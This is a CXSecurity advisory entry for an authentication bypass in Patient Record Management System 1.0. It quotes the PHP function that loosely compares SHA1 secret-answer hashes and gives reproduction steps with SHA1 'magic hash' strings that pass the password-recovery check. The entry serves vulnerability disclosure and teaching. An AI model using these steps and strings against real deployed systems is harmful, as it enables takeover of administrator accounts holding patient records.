---
title: Patient Record Management System 1.0 Authentication Bypass
url: https://cxsecurity.com/issue/WLB-2023010033
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-01-21
fetch_date: 2025-10-04T04:27:48.321872
---

# Patient Record Management System 1.0 Authentication Bypass

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Patient Record Management System 1.0 Authentication Bypass** **2023-01-20 / 2023-01-21**  Credit:  **[Joe Pollock](https://cxsecurity.com/author/Joe%2BPollock/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

# Exploit Title: Patient Record Management System v1.0 - Authentication Bypass via PHP Loose Comparison
# Exploit Author: Joe Pollock
# Date: January 19, 2023
# Vendor Homepage: https://www.sourcecodester.com/php/13505/patient-record-management-system.html
# Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/patientrecords.zip
# Tested on: Kali Linux, Apache, Mysql, PHP 8.1.5
# CVE: T.B.C
# Vendor: kimcey500
# Version: 1.0
# Exploit Description:
# Patient Record Management System v1.0 implements a PHP loose comparison within the password recovery functionality (secret question/answer) of
# the admin account, which renders the application vulnerable to an authentication bypass depending on the secret answer chosen by the administrator.
# If the secret answer generates a SHA1 magic hash (SHA1 is the hashing format used by the application to store secret answers) then an authentication
# bypass of the admin account is possible using any other SHA1 magic hash. The vulnerable function is found within User\_model.php and is shown below:
public function get\_forgot\_secret($login\_id, $secans){
$this->db->where('u\_id', $login\_id);
$query = $this->db->get('users');
$decrypt = $query->row()->u\_secretanswer;
if(sha1($secans) == $decrypt){ // md5 encryption
return $query->row();
}
}
========================================================
(+) To reproduce this exploit:
========================================================
1. Log in as the administrator and navigate to the password recovery functionality (http://localhost/Indexcontrol/secretquestion).
2. Enter the ‘Current Password’ then select any ‘Secret Question’.
3. For the ‘Secret Answer’, use the following: 10932435112
4. Confirm the ‘Secret Answer’ then click ‘Submit’. Now logout of the administrator account.
5. From the admin login page, click ‘Forgot Password?’.
6. Enter ‘admin’ as the username then click ‘Submit’.
7. For the ‘Secret Answer’, use any of the following:
aaroZmOk
w9KASOk6Ikap
aaO8zKZF
aa3OFF9m
w9KASOk6Ikap
8. After clicking 'Submit, the 'create new password' functionality should be displayed and therefore authentication can be bypassed.
========================================================
(+) Explanation:
========================================================
Following from above, assume the administrator has chosen the following as their secret answer:
10932435112
The application then stores the SHA1 hash of the secret answer in the database. The stored hash is:
0e07766915004133176347055865026311692244
The above hash is an example of a 'magic hash', i.e. the hash starts with "0e" (or "0..0e") only followed by numbers.
In PHP, if two strings are loosely compared (==) and match the regular expression 0+e[0-9]+, the result will be TRUE.
It will then be possible to bypass the authentication of this account using any secret answer which generates a SHA1 magic hash.
Any of the following secret answers could be used to bypass authentication:
aaroZmOk
w9KASOk6Ikap
aaO8zKZF
aa3OFF9m
w9KASOk6Ikap
See here for more examples that could be used: https://github.com/spaze/hashes/blob/master/sha1.md
The comparision which would take place by the application in get\_forgot\_secret() is:
if(sha1(aaroZmOk) == "0e07766915004133176347055865026311692244"){
//Reset password
Which becomes:
if("0e66507019969427134894567494305185566735" == "0e07766915004133176347055865026311692244"){
//Reset password
Due to the loose comparision used (==), the above evaluates to TRUE, which would then allow the attacker to change
the password of the account.
You can try this yourself using the interactive PHP interpreter:
var\_dump(sha1('aaroZmOk') == "0e111");
var\_dump(sha1('aaroZmOk') == "0e222");
var\_dump(sha1('aaroZmOk') == sha1('w9KASOk6Ikap'));
========================================================
(+) References and more information
========================================================
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Type%20Juggling/README.md
http://turbochaos.blogspot.com/2013/08/exploiting-exotic-bugs-php-type-juggling.html
https://www.whitehatsec.com/blog/magic-hashes/
https://github.com/spaze/hashes
https://offsec.almond.consulting/super-magic-hash.html

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023010033)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top